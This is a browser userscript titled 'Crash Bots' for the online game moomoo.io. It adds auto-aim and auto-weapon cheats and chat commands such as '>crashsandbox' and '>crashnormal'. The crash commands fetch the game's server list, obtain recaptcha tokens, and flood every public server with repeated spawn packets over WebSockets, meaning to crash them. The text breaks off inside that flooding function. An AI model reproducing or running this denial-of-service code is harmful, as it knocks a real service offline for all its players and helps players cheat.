// ==UserScript==
// @name        Crash Bots
// @version     3.0
// @description moomoo all servers crash bots for free commands: >crashsandbox >crashnormal >crashdev
// @namespace moomoo all servers crash bots for free commands: >crashsandbox >crashnormal >crashdev
// @author       Balwan_z_avatarus#4201
// @match        *://moomoo.io/*
// @match        *://dev.moomoo.io/*
// @match        *://sandbox.moomoo.io/*
// @grant        none
// @require https://greasyfork.org/scripts/423602-msgpack/code/msgpack.js?version=912797
// @require http://code.jquery.com/jquery-3.3.1.min.js
// @require https://code.jquery.com/ui/1.12.0/jquery-ui.min.js
// @require https://cdnjs.cloudflare.com/ajax/libs/jquery-confirm/3.3.0/jquery-confirm.min.js
// @downloadURL https://update.greasyfork.org/scripts/428618/Crash%20Bots.user.js
// @updateURL https://update.greasyfork.org/scripts/428618/Crash%20Bots.meta.js
// ==/UserScript==
//Commands
//>crashsandbox
//>crashnormal
//>crashdev

$("#leaderboard").css({
  'border':'3px solid #666666'
});

    $("#killCounter").css({
  'border':'3px solid #666666'
});
    $("#storeButton").css({
  'border':'3px solid #666666'
});
    $("#allianceButton").css({
  'border':'3px solid #666666'
});
    $("#scoreDisplay").css({
  'border':'3px solid #666666'
});
    $("#stoneDisplay").css({
  'border':'3px solid #666666'
});
    $("#woodDisplay").css({
  'border':'3px solid #666666'
});
    $("#foodDisplay").css({
  'border':'3px solid #666666'
});
    $("#mapDisplay").css({
  'border':'3px solid #666666'
});
    $("#rightCardHolder").css({
  'border':'3px solid #666666'
});
    $("#gameName").css({
  'border':'3px solid #666666'
});
//*-----------------------------RainbowHp-----------------------------*\\
let hue = 0;

let replaceInterval = setInterval(() => {
if (CanvasRenderingContext2D.prototype.roundRect) {
  CanvasRenderingContext2D.prototype.roundRect = ((oldFunc) => function() { if (this.fillStyle == "#8ecc51") this.fillStyle = `hsl(${hue}, 100%, 50%)`; return oldFunc.call(this, ...arguments); })(CanvasRenderingContext2D.prototype.roundRect);
  clearInterval(replaceInterval);
}}, 10);

function changeHue() {
  hue += Math.random() * 3;
}

setInterval(changeHue, 10);
let mouseX;
let mouseY;

let enemyX;
let enemyY;

let width;
let height;

setInterval(() => {
    if(autosecondary == true) {
        doNewSend(["5", [secondary, true]]);
        doNewSend(["5", [secondary, true]]);
        doNewSend(["5", [secondary, true]]);
    }
}, -99999999999);
//*-----------------------------AutoPrimary-----------------------------*\\
setInterval(() => {
    if(autoprimary == true) {
        doNewSend(["5", [primary, true]]);
        doNewSend(["5", [primary, true]]);
        doNewSend(["5", [primary, true]]);
    }
}, -99999999999);

//*-----------------------------AutoAim-----------------------------*\\
setInterval(() => {
    if(autoaim == true) {
        doNewSend(["2", [nearestEnemyAngle]]);
        doNewSend(["2", [nearestEnemyAngle]]);
    }
}, -99999999999);

setInterval(() => {
    if(autoaim == true) {
        doNewSend(["2", [nearestEnemyAngle]]);
    }
}, -99999999999);

//*-----------------------------Hats-----------------------------*\\

//*-----------------------------Function Normal-----------------------------*\\
function normal() {
    hat(normalHat);
    acc(normalAcc);
}

//*-----------------------------Function aim-----------------------------*\\
function aim(x, y){
    var cvs = document.getElementById("gameCanvas");
    cvs.dispatchEvent(new MouseEvent("mousemove", {
        clientX: x,
        clientY: y

    }));
}

let coreURL = new URL(window.location.href);
window.sessionStorage.force = coreURL.searchParams.get("fc");

var nearestEnemy;
var nearestEnemyAngle;
var isEnemyNear;
var primary;
var secondary;
var foodType;
var wallType;
var spikeType;
var millType = false;
var mineType;
var boostType;
var turretType;
var spawnpadType;
var autoaim = false;
var autoprimary = false;
var autosecondary = false;
var tick = 1;
var oldHat;
var oldAcc;
var enemiesNear;
var normalHat;
var clowned;
var normalAcc;
var ws;
var msgpack5 = msgpack;
var boostDir;
let myPlayer = {
    id: null,
    x: null,
    y: null,
    dir: null,
    object: null,
    weapon: null,
    clan: null,
    isLeader: null,
    hat: null,
    accessory: null,
    isSkull: null
};
let enemy = {
    id: null,
    x: null,
    y: null,
    dir: null,
    object: null,
    weapon: null,
    clan: null,
    isLeader: null,
    hat: null,
    accessory: null,
    isSkull: null
};
let healSpeed = 160;
var messageToggle = 0;
var clanToggle = 0;
var healToggle = false;
let hatToggle = 1;
document.disabledItems = [];

document.msgpack = msgpack;
function n(){
     this.buffer = new Uint8Array([0]);
     this.buffer.__proto__ = new Uint8Array;
     this.type = 0;
}


WebSocket.prototype.oldSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(m){
    if (!ws){
        document.ws = this;

        ws = this;
        socketFound(this);
    }
    this.oldSend(m);
};

function socketFound(socket){
    socket.addEventListener('message', function(message){
        handleMessage(message);
    });
}

function handleMessage(m){
    let temp = msgpack5.decode(new Uint8Array(m.data));
    let data;
    if(temp.length > 1) {
        data = [temp[0], ...temp[1]];
        if (data[1] instanceof Array){
            data = data;
        }
    } else {
      data = temp;
    }
    let item = data[0];
    if(!data) {return};

    if(item === "io-init") {
            let cvs = document.getElementById("gameCanvas");
            width = cvs.clientWidth;
            height = cvs.clientHeight;
            $(window).resize(function() {
                width = cvs.clientWidth;
                height = cvs.clientHeight;
            });
            cvs.addEventListener("mousemove", e => {
                mouseX = e.clientX;
                mouseY = e.clientY;
            });
        }

    if (item == "1" && myPlayer.id == null){
        myPlayer.id = data[1];
    }

    if (item == "33") {
        enemiesNear = [];
        for(let i = 0; i < data[1].length / 13; i++) {
            let playerInfo = data[1].slice(13*i, 13*i+13);
            if(playerInfo[0] == myPlayer.id) {
                myPlayer.x = playerInfo[1];
                myPlayer.y = playerInfo[2];
                myPlayer.dir = playerInfo[3];
                myPlayer.object = playerInfo[4];
                myPlayer.weapon = playerInfo[5];
                myPlayer.clan = playerInfo[7];
                myPlayer.isLeader = playerInfo[8];
                myPlayer.hat = playerInfo[9];
                myPlayer.accessory = playerInfo[10];
                myPlayer.isSkull = playerInfo[11];
            } else if(playerInfo[7] != myPlayer.clan || playerInfo[7] === null) {
                enemiesNear.push(playerInfo);
            }
        }
    }
    isEnemyNear = false;

    if(nearestEnemy) {
        nearestEnemyAngle = Math.atan2(nearestEnemy[2]-myPlayer.y, nearestEnemy[1]-myPlayer.x);
        if(Math.sqrt(Math.pow((myPlayer.y-nearestEnemy[2]), 2) + Math.pow((myPlayer.x-nearestEnemy[1]), 2)) < 0) {
            isEnemyNear = true;
            if(autoaim == false && myPlayer.hat != 7 && myPlayer.hat != 53) {
                normalHat = 6;
                if(primary != 8) {
                    normalAcc = 19
                }
            };
        }
    }
    if(item == "h" && data[1] == myPlayer.id) {
        myPlayer.health = data[2];
    }

    if (!nearestEnemy) {
        nearestEnemyAngle = myPlayer.dir;
    }
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '>crashdev' && data[1] == myPlayer.id) {
    riverNormalRegion1();
            setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '>crashsandbox' && data[1] == myPlayer.id) {
                riverAllSandbox();
                setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '>crashnormal' && data[1] == myPlayer.id) {
                riverNormalRegion();
                setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
                if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '<crashdev' && data[1] == myPlayer.id) {
    riverNormalRegion1();
            setTimeout( () => {
                    doNewSend(["ch", ["[River] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '<crashsandbox' && data[1] == myPlayer.id) {
                riverAllSandbox();
                setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '<crashnormal' && data[1] == myPlayer.id) {
                riverNormalRegion();
                setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '.crashdev' && data[1] == myPlayer.id) {
    riverNormalRegion1();
            setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '.crashsandbox' && data[1] == myPlayer.id) {
                riverAllSandbox();
                setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '.crashnormal' && data[1] == myPlayer.id) {
                riverNormalRegion();
                setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == 'crashdev' && data[1] == myPlayer.id) {
    riverNormalRegion1();
            setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == 'crashsandbox' && data[1] == myPlayer.id) {
                riverAllSandbox();
                setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
            if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == 'crashnormal' && data[1] == myPlayer.id) {
                riverNormalRegion();
                setTimeout( () => {
                    doNewSend(["ch", ["[Crash] = [Started]"]]);
                }, 1000);
            }};
function doNewSend(sender){
    ws.send(new Uint8Array(Array.from(msgpack5.encode(sender))));
}

function acc(id) {
    doNewSend(["13c", [0, 0, 1]]);
    doNewSend(["13c", [0, id, 1]]);
}

function hat(id) {
    doNewSend(["13c", [0, id, 0]]);
}

function riverAllSandbox() {
    fetch("http://sandbox.moomoo.io/serverData.js").then(e => e.text()).then(e => {
        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
        for (let gameServer of vultr.servers) {
            let serverhost = `wss://ip_${gameServer.ip}.moomoo.io:8008/?gameIndex=0`;
            let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
            grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                riverType(`${serverhost}&token=${encodeURIComponent(e)}`, `${gameServer.region.split(":")[1]}:${gameServer.index}:0`);
    update();
            }));
        }
    })
}
function riverNormalRegion() {
    fetch("http://moomoo.io/serverData.js").then(e => e.text()).then(e => {
        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
        for (let gameServer of vultr.servers) {
            let serverhost = `wss://ip_${gameServer.ip}.moomoo.io:8008/?gameIndex=0`;
            let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
            grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                riverType(`${serverhost}&token=${encodeURIComponent(e)}`, `${gameServer.region.split(":")[1]}:${gameServer.index}:0`);
    update();
            }));
        }
    })
}
function riverNormalRegion1() {
    fetch("http://dev.moomoo.io/serverData.js").then(e => e.text()).then(e => {
        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
        for (let gameServer of vultr.servers) {
            let serverhost = `wss://ip_${gameServer.ip}.moomoo.io:8008/?gameIndex=0`;
            let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
            grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                riverType(`${serverhost}&token=${encodeURIComponent(e)}`, `${gameServer.region.split(":")[1]}:${gameServer.index}:0`);
    update();
            }));
        }
    })
}
function riverType(e, logForCrashedServer) {
    let ws = new WebSocket(e);
ws.open = 2000
    ws.msgs = 0;
    ws.onopen = () => {
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
